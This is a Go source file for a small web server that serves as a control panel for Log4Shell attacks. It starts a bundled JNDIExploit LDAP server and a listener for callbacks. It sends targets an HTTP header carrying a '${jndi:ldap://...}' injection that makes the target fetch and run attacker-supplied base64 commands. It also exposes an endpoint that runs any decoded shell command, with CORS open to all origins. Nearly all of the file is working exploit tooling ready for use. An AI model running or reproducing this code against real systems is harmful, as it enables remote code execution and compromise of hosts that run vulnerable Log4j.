package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	externalip "github.com/glendc/go-external-ip"
)

var resultChannel = make(chan string)

func main() {
	router := gin.Default()
	router.Use(cors.New(cors.Config{
		AllowAllOrigins: true,
	}))
	router.GET("/", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "Hello, World!",
		})
	})
	router.GET("/findip", func(c *gin.Context) {
		intIP, err := GetIntIP()
		if err != nil {
			c.JSON(500, gin.H{
				"error": err.Error(),
			})
			return
		} else {
			c.JSON(200, gin.H{
				"ip": intIP.String(),
			})
		}
	})
	router.GET("/findextip", func(c *gin.Context) {
		extIP, err := GetExtIP()
		if err != nil {
			c.JSON(500, gin.H{
				"error": err.Error(),
			})
			return
		} else {
			c.JSON(200, gin.H{
				"ip": extIP,
			})
		}
	})
	router.GET("/findjava", func(c *gin.Context) {
		javaPath := FindJava()
		if javaPath == "" {
			c.JSON(500, gin.H{
				"error": "Java not found",
			})
			return
		} else {
			c.JSON(200, gin.H{
				"java": javaPath,
			})
		}
	})
	router.GET("/startncat", func(c *gin.Context) {
		host := c.DefaultQuery("host", "localhost")
		port := c.DefaultQuery("port", "1304")
		portInt, err := strconv.Atoi(port)
		if err != nil {
			c.JSON(400, gin.H{
				"error": "Invalid port",
			})
			return
		}
		go StartNcat(host, portInt)
		status := <-ncatStatus
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/stopncat", func(c *gin.Context) {
		status := StopNcat()
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/checkncat", func(c *gin.Context) {
		status := CheckNcat()
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/startjndi", func(c *gin.Context) {
		status, err := StartJNDIServer()
		if err != nil {
			c.JSON(500, gin.H{
				"error": err.Error(),
			})
			return
		}
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/stopjndi", func(c *gin.Context) {
		status := StopJNDIServer()
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/checkjndi", func(c *gin.Context) {
		status := CheckJNDIServer()
		c.JSON(200, gin.H{
			"message": status,
		})
	})
	router.GET("/inputcmd", func(c *gin.Context) {
		command := c.Query("command")
		if command == "" {
			c.JSON(400, gin.H{
				"error": "Command is required",
			})
			return
		}
		out, err := InputCMD(command)
		if err != nil {
			c.JSON(500, gin.H{
				"error": err.Error(),
			})
			return
		}
		c.JSON(200, gin.H{
			"output": out,
		})
	})
	router.GET("/sendpayload", func(c *gin.Context) {
		payload := c.Query("payload")
		targetip := c.Query("targetip")
		if payload == "" {
			c.JSON(400, gin.H{
				"error": "Payload is required",
			})
			return
		}
		if targetip == "" {
			c.JSON(400, gin.H{
				"error": "Target IP is required",
			})
			return
		}
		go SendPayload(payload, targetip, resultChannel)
		result := <-resultChannel
		c.JSON(200, gin.H{
			"result": result,
		})
	})
	router.Run(":8000")
}

// -------------------------- Start of Payload Sender -------------------------- //
func SendPayload(payload string, targetip string, resultChan chan<- string) {
	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		resultChan <- fmt.Sprintf("Error decoding payload: %s", err.Error())
		return
	}
	intIP, err := GetIntIP()
	if err != nil {
		resultChan <- fmt.Sprintf("Error getting internal IP: %s", err.Error())
		return
	}
	target := fmt.Sprintf("%s:8080", targetip)
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		resultChan <- fmt.Sprintf("Target is not reachable: %s", err.Error())
		return
	}
	conn.Close()
	reqPayload := fmt.Sprintf("${jndi:ldap://%s:1389/Basic/Command/Base64/%s}", intIP.String(), payload)
	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
	if err != nil {
		resultChan <- fmt.Sprintf("Error creating HTTP request: %s", err.Error())
		return
	}
	req.Header.Add("X-Api-Version", reqPayload)
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		resultChan <- fmt.Sprintf("Error sending HTTP request: %s", err.Error())
		return
	}
	defer resp.Body.Close()
	respPayload, err := io.ReadAll(resp.Body)
	if err != nil {
		resultChan <- fmt.Sprintf("Error reading HTTP response: %s", err.Error())
		return
	}
	if string(respPayload) == "Hello, world!" {
		resultChan <- "Payload sent successfully"
	} else {
		resultChan <- fmt.Sprintf("Payload sent with Decoded-Payload: %s and Request-Payload: %s and Response-Payload: %s", string(decodedPayload), reqPayload, string(respPayload))
	}
}

// -------------------------- End of Payload Sender -------------------------- //

// -------------------------- Start of JNDI Server -------------------------- //
var jndiCmd *exec.Cmd

func StartJNDIServer() (string, error) {
	jdnipath := "./dependencies/jndiexploit_1.2/JNDIExploit-1.2.jar"
	javapath := FindJava()
	intIP, err := GetIntIP()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(javapath, "-jar", jdnipath, "-i", intIP.String(), "-p", "8888")
	err = cmd.Start()
	if err != nil {
		return "", err
	}
	jndiCmd = cmd
	return "JNDI server started on " + intIP.String() + ":8888", nil
}

func StopJNDIServer() string {
	if jndiCmd != nil && jndiCmd.Process != nil {
		err := jndiCmd.Process.Kill()
		if err != nil {
			return "Error stopping JNDI server: " + err.Error()
		}
		jndiCmd = nil // Clear the stored command
		return "JNDI server stopped"
	}
	return "JNDI server is not running"
}

func CheckJNDIServer() string {
	if jndiCmd != nil && jndiCmd.Process != nil {
		return "JNDI server is running"
	} else {
		return "JNDI server is not running"
	}
}

// -------------------------- End of JNDI Server -------------------------- //

// -------------------------- Start of IP Finder -------------------------- //
func GetIntIP() (net.IP, error) {
	var (
		ret    net.IP
		err    error
		ifaces []net.Interface
		addrs  []net.Addr
	)
	if ifaces, err = net.Interfaces(); err == nil {
		for _, i := range ifaces {
			if addrs, err = i.Addrs(); err == nil {
				for _, a := range addrs {
					if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
						if ipv4 := ipnet.IP.To4(); ipv4 != nil && ipv4.IsGlobalUnicast() {
							ret = ipv4
							return ret, nil
						}
					}
				}
			}
		}
	}
	return nil, err
}

func GetExtIP() (string, error) {
	consensus := externalip.DefaultConsensus(nil, nil)
	ip, err := consensus.ExternalIP()
	if err != nil {
		return "", err
	}
	return ip.String(), nil
}

// -------------------------- End of IP Finder -------------------------- //

// -------------------------- Start of Java Finder -------------------------- //
func FindJava() string {
	javapath, err := exec.LookPath("java")
	os := runtime.GOOS
	if err != nil {
		switch os {
		// case "windows":
		// 	javapath = "./dependencies/jdk-22.0.1-windows/bin/java.exe"
		case "linux":
			javapath = "./dependencies/jdk_linux/bin/java"
		// case "darwin":
		// 	javapath = "./dependencies/jdk-22.0.1-macos/bin/java"
		default:
			javapath = "Error: Unsupported OS"
		}
	}
	return javapath
}

// -------------------------- End of Java Finder -------------------------- //

// -------------------------- Start of Ncat Server -------------------------- //
var listener net.Listener
var ncatStatus = make(chan string, 1) // Buffered channel to hold status messages

func StartNcat(host string, port int) {
	go func() {
		var err error
		listener, err = net.Listen("tcp", fmt.Sprintf("%s:%d", host, port))
		if err != nil {
			ncatStatus <- "Error listening: " + err.Error()
			return
		}
		ncatStatus <- "Listening on " + host + ":" + strconv.Itoa(port)
		for {
			conn, err := listener.Accept()
			if err != nil {
				ncatStatus <- "Error accepting: " + err.Error()
				return
			}
			go handleRequest(conn)
		}
	}()
}

func handleRequest(conn net.Conn) {
	buf := make([]byte, 1024)
	for {
		reqLen, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				ncatStatus <- "Error reading: " + err.Error()
			}
			break
		}
		ncatStatus <- string(buf[:reqLen])
	}
	conn.Close()
}

func StopNcat() string {
	if listener != nil {
		err := listener.Close()
		if err != nil {
			return "Error closing listener: " + err.Error()
		}
		listener = nil
		return "Ncat server stopped"
	}
	return "Ncat server is not running"
}

func CheckNcat() string {
	if listener != nil {
		return "Ncat server is running"
	} else {
		return "Ncat server is not running"
	}
}

// -------------------------- End of Ncat Server -------------------------- //

func InputCMD(command string) (string, error) {
	decodedcmd, err := base64.StdEncoding.DecodeString(command)
	if err != nil {
		return "", err
	}
	parts := strings.Fields(string(decodedcmd))
	if len(parts) == 0 {
		return "", fmt.Errorf("no command provided")
	}
	cmd := exec.Command(parts[0], parts[1:]...)
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}
